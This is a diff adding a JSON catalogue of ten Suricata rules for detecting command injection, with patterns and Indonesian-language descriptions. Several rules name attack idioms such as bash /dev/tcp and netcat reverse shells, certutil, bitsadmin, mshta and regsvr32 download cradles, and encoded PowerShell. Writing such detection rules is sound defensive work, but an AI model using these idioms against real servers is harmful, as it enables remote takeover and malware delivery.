@@ -1,0 +1,497 @@
+{
+  "$schema": "1.0",
+  "generated_at": "2026-05-22T05:30:43Z",
+  "category": "cmdi",
+  "rules": [
+    {
+      "sid": 9120001,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi shell-separator + cat /etc/ in http.uri [medium]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0002",
+        "mitre_tactic_name": "Execution",
+        "mitre_technique_id": "T1059",
+        "mitre_technique_name": "Command-and-Scripting-Interpreter",
+        "kill_chain": "Exploitation",
+        "confidence": "medium",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120001_shellsep-cat-etc/poc.sh",
+        "tag": "cmdi",
+        "created_at": "2026_05_19",
+        "updated_at": "2026_05_19",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "cat /etc/",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/[\\x3b\\x7c\\x26\\x60]\\s*cat\\s+\\/etc\\//i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120001_shellsep-cat-etc/",
+      "readme": "suricata/tests/poc/9120001_shellsep-cat-etc/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi shell-separator + cat /etc/ in http.uri [medium]\"; flow:established,to_server; http.uri; content:\"cat /etc/\"; nocase; fast_pattern; pcre:\"/[\\x3b\\x7c\\x26\\x60]\\s*cat\\s+\\/etc\\//i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence medium, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120001_shellsep-cat-etc/poc.sh, tag cmdi, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120001; rev:1;)",
+      "description": {
+        "attack": "Command injection: penyerang menyisipkan pemisah shell (; | & atau backtick) lalu perintah `cat /etc/...` di parameter URL untuk membaca file sensitif server.",
+        "impact": "Pembacaan file rahasia server (mis. /etc/passwd, config) — pintu masuk ke kompromi penuh.",
+        "detects": "Pola pemisah-shell tepat sebelum `cat /etc/` di URL; URL sah tidak pernah membawanya."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120002,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi bash reverse shell /dev/tcp/ in http.uri [high]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0002",
+        "mitre_tactic_name": "Execution",
+        "mitre_technique_id": "T1059",
+        "mitre_technique_name": "Command-and-Scripting-Interpreter",
+        "kill_chain": "Exploitation",
+        "confidence": "high",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120002_bash-reverse-shell/poc.sh",
+        "tag": "cmdi-revshell",
+        "created_at": "2026_05_19",
+        "updated_at": "2026_05_19",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "/dev/tcp/",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/\\/dev\\/tcp\\/(?:\\d{1,3}(?:\\.\\d{1,3}){3}|[a-z0-9.-]+)\\/\\d{1,5}/i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120002_bash-reverse-shell/",
+      "readme": "suricata/tests/poc/9120002_bash-reverse-shell/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi bash reverse shell /dev/tcp/ in http.uri [high]\"; flow:established,to_server; http.uri; content:\"/dev/tcp/\"; nocase; fast_pattern; pcre:\"/\\/dev\\/tcp\\/(?:\\d{1,3}(?:\\.\\d{1,3}){3}|[a-z0-9.-]+)\\/\\d{1,5}/i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120002_bash-reverse-shell/poc.sh, tag cmdi-revshell, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120002; rev:1;)",
+      "description": {
+        "attack": "Penyerang menyuntik idiom reverse-shell bash `/dev/tcp/<host>/<port>` lewat command injection agar server 'menelepon balik' ke mesin penyerang.",
+        "impact": "Shell interaktif penuh ke server (Remote Code Execution) — kendali penuh.",
+        "detects": "Idiom `/dev/tcp/<host>/<port>` di URL — tidak pernah muncul di lalu lintas jinak."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120003,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB SSTI computed probe {{7*7}} (Jinja/Twig) in http.uri [medium]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0002",
+        "mitre_tactic_name": "Execution",
+        "mitre_technique_id": "T1059",
+        "mitre_technique_name": "Command-and-Scripting-Interpreter",
+        "kill_chain": "Exploitation",
+        "confidence": "medium",
+        "signature_severity": "Major",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120003_ssti-computed-probe/poc.sh",
+        "tag": "ssti",
+        "created_at": "2026_05_19",
+        "updated_at": "2026_05_19",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "{{7*7}}",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/\\{\\{\\s*7\\s*\\*\\s*7\\s*\\}\\}/",
+      "has_detection_filter": true,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120003_ssti-computed-probe/",
+      "readme": "suricata/tests/poc/9120003_ssti-computed-probe/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB SSTI computed probe {{7*7}} (Jinja/Twig) in http.uri [medium]\"; flow:established,to_server; http.uri; content:\"{{7*7}}\"; nocase; fast_pattern; pcre:\"/\\{\\{\\s*7\\s*\\*\\s*7\\s*\\}\\}/\"; detection_filter:track by_src, count 3, seconds 60; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence medium, signature_severity Major, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120003_ssti-computed-probe/poc.sh, tag ssti, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120003; rev:1;)",
+      "description": {
+        "attack": "Server-Side Template Injection (SSTI): penyerang mengirim probe aritmetika `{{7*7}}` (Jinja/Twig) untuk menguji apakah input dieksekusi sebagai template.",
+        "impact": "SSTI yang berhasil biasanya berujung Remote Code Execution di server.",
+        "detects": "Literal probe `{{7*7}}` di URL (threshold 3/60 detik sebagai kompensator FP)."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120004,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi PowerShell encoded command in http.uri [medium]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0002",
+        "mitre_tactic_name": "Execution",
+        "mitre_technique_id": "T1059",
+        "mitre_technique_name": "Command-and-Scripting-Interpreter",
+        "kill_chain": "Exploitation",
+        "confidence": "medium",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120004_powershell-encoded/poc.sh",
+        "tag": "cmdi-powershell",
+        "created_at": "2026_05_19",
+        "updated_at": "2026_05_19",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "powershell",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/powershell(?:\\.exe)?[^\\r\\n]{0,40}\\s-e(?:c|nc|ncodedcommand)?\\s+[A-Za-z0-9+\\/=]{24,}/i",
+      "has_detection_filter": true,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120004_powershell-encoded/",
+      "readme": "suricata/tests/poc/9120004_powershell-encoded/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi PowerShell encoded command in http.uri [medium]\"; flow:established,to_server; http.uri; content:\"powershell\"; nocase; fast_pattern; pcre:\"/powershell(?:\\.exe)?[^\\r\\n]{0,40}\\s-e(?:c|nc|ncodedcommand)?\\s+[A-Za-z0-9+\\/=]{24,}/i\"; detection_filter:track by_src, count 3, seconds 60; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence medium, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120004_powershell-encoded/poc.sh, tag cmdi-powershell, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120004; rev:1;)",
+      "description": {
+        "attack": "Command injection PowerShell: penyerang menjalankan perintah ter-encode base64 lewat flag `-EncodedCommand` agar lolos filter.",
+        "impact": "Eksekusi perintah arbitrer di server Windows (RCE).",
+        "detects": "`powershell` + flag -e/-enc/-EncodedCommand diikuti blob base64 panjang (threshold 3/60 detik)."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120005,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi Windows certutil -urlcache download cradle in http.uri [high]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0011",
+        "mitre_tactic_name": "Command-and-Control",
+        "mitre_technique_id": "T1105",
+        "mitre_technique_name": "Ingress-Tool-Transfer",
+        "kill_chain": "Installation",
+        "confidence": "high",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120005_certutil-download-cradle/poc.sh",
+        "tag": "cmdi-lolbin",
+        "created_at": "2026_05_19",
+        "updated_at": "2026_05_19",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "-urlcache",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/certutil(?:\\.exe)?(?:\\s|%20|\\+)[^\\r\\n]{0,40}-urlcache[^\\r\\n]{0,60}https?(?::|%3a)/i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120005_certutil-download-cradle/",
+      "readme": "suricata/tests/poc/9120005_certutil-download-cradle/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi Windows certutil -urlcache download cradle in http.uri [high]\"; flow:established,to_server; http.uri; content:\"-urlcache\"; nocase; fast_pattern; pcre:\"/certutil(?:\\.exe)?(?:\\s|%20|\\+)[^\\r\\n]{0,40}-urlcache[^\\r\\n]{0,60}https?(?::|%3a)/i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0011, mitre_tactic_name Command-and-Control, mitre_technique_id T1105, mitre_technique_name Ingress-Tool-Transfer, kill_chain Installation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120005_certutil-download-cradle/poc.sh, tag cmdi-lolbin, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120005; rev:1;)",
+      "description": {
+        "attack": "Pasca command injection di Windows, penyerang pakai LOLBin `certutil -urlcache -f http://...` untuk mengunduh malware tahap-2.",
+        "impact": "Penarikan & eksekusi malware (beacon C2, ransomware) — pijakan jadi kendali penuh persisten.",
+        "detects": "Kombinasi `certutil` + `-urlcache` + URL http(s) dalam jendela terbatas di URL request."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120006,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi Windows bitsadmin /transfer download cradle in http.uri [high]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0011",
+        "mitre_tactic_name": "Command-and-Control",
+        "mitre_technique_id": "T1105",
+        "mitre_technique_name": "Ingress-Tool-Transfer",
+        "kill_chain": "Installation",
+        "confidence": "high",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120006_bitsadmin-cradle/poc.sh",
+        "tag": "cmdi-lolbin",
+        "created_at": "2026_05_19",
+        "updated_at": "2026_05_19",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "bitsadmin",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/bitsadmin(?:\\.exe)?(?:\\s|%20|\\+)[^\\r\\n]{0,60}\\/transfer[^\\r\\n]{0,80}https?(?::|%3a)/i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120006_bitsadmin-cradle/",
+      "readme": "suricata/tests/poc/9120006_bitsadmin-cradle/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi Windows bitsadmin /transfer download cradle in http.uri [high]\"; flow:established,to_server; http.uri; content:\"bitsadmin\"; nocase; fast_pattern; pcre:\"/bitsadmin(?:\\.exe)?(?:\\s|%20|\\+)[^\\r\\n]{0,60}\\/transfer[^\\r\\n]{0,80}https?(?::|%3a)/i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0011, mitre_tactic_name Command-and-Control, mitre_technique_id T1105, mitre_technique_name Ingress-Tool-Transfer, kill_chain Installation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120006_bitsadmin-cradle/poc.sh, tag cmdi-lolbin, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120006; rev:1;)",
+      "description": {
+        "attack": "Pasca command injection Windows, penyerang pakai LOLBin `bitsadmin /transfer ... http://...` untuk mengunduh malware tahap-2 (alternatif certutil).",
+        "impact": "Penarikan & eksekusi malware (beacon C2/ransomware) — pijakan jadi kendali penuh persisten.",
+        "detects": "Kombinasi `bitsadmin` + `/transfer` + URL http(s) dalam jendela terbatas di URL."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120007,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi Windows mshta remote HTA execution in http.uri [high]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0011",
+        "mitre_tactic_name": "Command-and-Control",
+        "mitre_technique_id": "T1105",
+        "mitre_technique_name": "Ingress-Tool-Transfer",
+        "kill_chain": "Installation",
+        "confidence": "high",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120007_mshta-remote-hta/poc.sh",
+        "tag": "cmdi-lolbin",
+        "created_at": "2026_05_20",
+        "updated_at": "2026_05_20",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "mshta",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/mshta(?:\\.exe)?(?:\\s|%20|\\+)[^\\r\\n]{0,40}https?(?::|%3a)(?:\\/\\/|%2f%2f)[^\\r\\n]{0,80}\\.(?:hta|html|htm|js)/i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120007_mshta-remote-hta/",
+      "readme": "suricata/tests/poc/9120007_mshta-remote-hta/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi Windows mshta remote HTA execution in http.uri [high]\"; flow:established,to_server; http.uri; content:\"mshta\"; nocase; fast_pattern; pcre:\"/mshta(?:\\.exe)?(?:\\s|%20|\\+)[^\\r\\n]{0,40}https?(?::|%3a)(?:\\/\\/|%2f%2f)[^\\r\\n]{0,80}\\.(?:hta|html|htm|js)/i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0011, mitre_tactic_name Command-and-Control, mitre_technique_id T1105, mitre_technique_name Ingress-Tool-Transfer, kill_chain Installation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120007_mshta-remote-hta/poc.sh, tag cmdi-lolbin, created_at 2026_05_20, updated_at 2026_05_20, author huntingyuk; sid:9120007; rev:1;)",
+      "description": {
+        "attack": "Pasca command injection Windows, penyerang pakai LOLBin `mshta http://...hta` untuk mengeksekusi skrip HTA jarak jauh tanpa menulis ke disk.",
+        "impact": "Remote Code Execution / file-less malware loader (sering jadi tahap awal infection chain).",
+        "detects": "`mshta` + URL http(s) berakhiran `.hta/.html/.htm/.js` dalam jendela terbatas di URL request."
+      },
+      "bench_status_§17": "OVERLAP"
+    },
+    {
+      "sid": 9120008,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi Windows regsvr32 Squiblydoo (scrobj.dll) remote scriptlet in http.uri [high]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0005",
+        "mitre_tactic_name": "Defense-Evasion",
+        "mitre_technique_id": "T1218.010",
+        "mitre_technique_name": "Regsvr32",
+        "kill_chain": "Installation",
+        "confidence": "high",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120008_regsvr32-squiblydoo/poc.sh",
+        "tag": "cmdi-lolbin",
+        "created_at": "2026_05_20",
+        "updated_at": "2026_05_20",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "scrobj.dll",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/regsvr32(?:\\.exe)?[^\\r\\n]{0,80}(?:\\/i\\x3a|%2fi%3a)https?(?::|%3a)(?:\\/\\/|%2f%2f)[^\\r\\n]{0,80}scrobj\\.dll/i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120008_regsvr32-squiblydoo/",
+      "readme": "suricata/tests/poc/9120008_regsvr32-squiblydoo/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi Windows regsvr32 Squiblydoo (scrobj.dll) remote scriptlet in http.uri [high]\"; flow:established,to_server; http.uri; content:\"scrobj.dll\"; nocase; fast_pattern; pcre:\"/regsvr32(?:\\.exe)?[^\\r\\n]{0,80}(?:\\/i\\x3a|%2fi%3a)https?(?::|%3a)(?:\\/\\/|%2f%2f)[^\\r\\n]{0,80}scrobj\\.dll/i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0005, mitre_tactic_name Defense-Evasion, mitre_technique_id T1218.010, mitre_technique_name Regsvr32, kill_chain Installation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120008_regsvr32-squiblydoo/poc.sh, tag cmdi-lolbin, created_at 2026_05_20, updated_at 2026_05_20, author huntingyuk; sid:9120008; rev:1;)",
+      "description": {
+        "attack": "Squiblydoo: `regsvr32 /i:http(s)://.../p.sct scrobj.dll` — LOLBin Windows untuk mengeksekusi scriptlet (JS/VBS) remote, bypass banyak AV.",
+        "impact": "Remote Code Execution dengan binary signed-Microsoft (defense evasion).",
+        "detects": "Kombinasi `regsvr32` + `/i:http(s)://` + `scrobj.dll` dalam jendela terbatas di URL."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120009,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi python -c inline-script execution in http.uri [high]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0002",
+        "mitre_tactic_name": "Execution",
+        "mitre_technique_id": "T1059",
+        "mitre_technique_name": "Command-and-Scripting-Interpreter",
+        "kill_chain": "Exploitation",
+        "confidence": "high",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120009_python-inline-exec/poc.sh",
+        "tag": "cmdi-python",
+        "created_at": "2026_05_20",
+        "updated_at": "2026_05_20",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "python -c",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/python(?:3)?(?:\\s|%20|\\+)+-c[^\\r\\n]{0,40}?[\\x27\\x22](?:[^\\x27\\x22]{0,200}?(?:os\\.system|subprocess\\.(?:Popen|run|call|check_output)|socket\\.socket|__import__\\s*\\(\\s*[\\x27\\x22](?:os|subprocess|socket)))/i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120009_python-inline-exec/",
+      "readme": "suricata/tests/poc/9120009_python-inline-exec/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi python -c inline-script execution in http.uri [high]\"; flow:established,to_server; http.uri; content:\"python -c\"; nocase; fast_pattern; pcre:\"/python(?:3)?(?:\\s|%20|\\+)+-c[^\\r\\n]{0,40}?[\\x27\\x22](?:[^\\x27\\x22]{0,200}?(?:os\\.system|subprocess\\.(?:Popen|run|call|check_output)|socket\\.socket|__import__\\s*\\(\\s*[\\x27\\x22](?:os|subprocess|socket)))/i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120009_python-inline-exec/poc.sh, tag cmdi-python, created_at 2026_05_20, updated_at 2026_05_20, author huntingyuk; sid:9120009; rev:1;)",
+      "description": {
+        "attack": "Pasca command injection, penyerang pakai `python -c '<script>'` untuk eksekusi inline berisi `os.system`/`subprocess`/`socket.socket` (reverse shell, exec perintah arbitrer).",
+        "impact": "Remote Code Execution / reverse shell di server target — penyerang dapat shell penuh.",
+        "detects": "`python -c` + script berisi import berbahaya (`os.system`/`subprocess.Popen|run|call`/`socket.socket`/`__import__`) di URL."
+      },
+      "bench_status_§17": "GAP"
+    },
+    {
+      "sid": 9120010,
+      "rev": 1,
+      "enabled": true,
+      "file": "suricata/rules/plaintext/cmdi.rules",
+      "msg": "WEB CMDi netcat -e reverse shell (nc/ncat -e /bin/sh) in http.uri [high]",
+      "classtype": "web-application-attack",
+      "category": "cmdi",
+      "metadata": {
+        "asset_category": "web-mixed",
+        "owasp": "A03-Injection",
+        "attack_target": "Server",
+        "mitre_tactic_id": "TA0002",
+        "mitre_tactic_name": "Execution",
+        "mitre_technique_id": "T1059",
+        "mitre_technique_name": "Command-and-Scripting-Interpreter",
+        "kill_chain": "Exploitation",
+        "confidence": "high",
+        "signature_severity": "Critical",
+        "deployment": "Perimeter",
+        "network_mode": "plain",
+        "cve": "none",
+        "poc_ref": "tests/poc/9120010_nc-revshell/poc.sh",
+        "tag": "cmdi-revshell",
+        "created_at": "2026_05_20",
+        "updated_at": "2026_05_20",
+        "author": "huntingyuk"
+      },
+      "fast_pattern": {
+        "content": "nc -e",
+        "nocase": true
+      },
+      "has_pcre": true,
+      "pcre": "/n(?:c|cat)(?:\\.traditional)?(?:\\s|%20|\\+)-e(?:\\s|%20|\\+)\\/bin\\/(?:sh|bash|dash|zsh)[^\\r\\n]{0,40}?(?:\\d{1,3}(?:\\.\\d{1,3}){3}|[a-z0-9.-]+)(?:\\s|%20|\\+)\\d{1,5}/i",
+      "has_detection_filter": false,
+      "has_threshold": false,
+      "buffers": [
+        "http.uri"
+      ],
+      "poc_dir": "suricata/tests/poc/9120010_nc-revshell/",
+      "readme": "suricata/tests/poc/9120010_nc-revshell/README.md",
+      "raw": "alert http any any -> any any (msg:\"WEB CMDi netcat -e reverse shell (nc/ncat -e /bin/sh) in http.uri [high]\"; flow:established,to_server; http.uri; content:\"nc -e\"; nocase; fast_pattern; pcre:\"/n(?:c|cat)(?:\\.traditional)?(?:\\s|%20|\\+)-e(?:\\s|%20|\\+)\\/bin\\/(?:sh|bash|dash|zsh)[^\\r\\n]{0,40}?(?:\\d{1,3}(?:\\.\\d{1,3}){3}|[a-z0-9.-]+)(?:\\s|%20|\\+)\\d{1,5}/i\"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120010_nc-revshell/poc.sh, tag cmdi-revshell, created_at 2026_05_20, updated_at 2026_05_20, author huntingyuk; sid:9120010; rev:1;)",
+      "description": {
+        "attack": "Pasca command injection, penyerang panggil `nc -e /bin/sh <attacker> <port>` — idiom reverse-shell klasik (juga `ncat -e`, varian distro).",
+        "impact": "Reverse shell penuh ke server penyerang — kendali shell interaktif terhadap server target.",
+        "detects": "`nc -e` / `ncat -e` + path shell (`/bin/sh|bash|dash|zsh`) + IP/hostname + port di URL — high conf, tanpa threshold."
+      },
+      "bench_status_§17": "GAP"
+    }
+  ]
+}
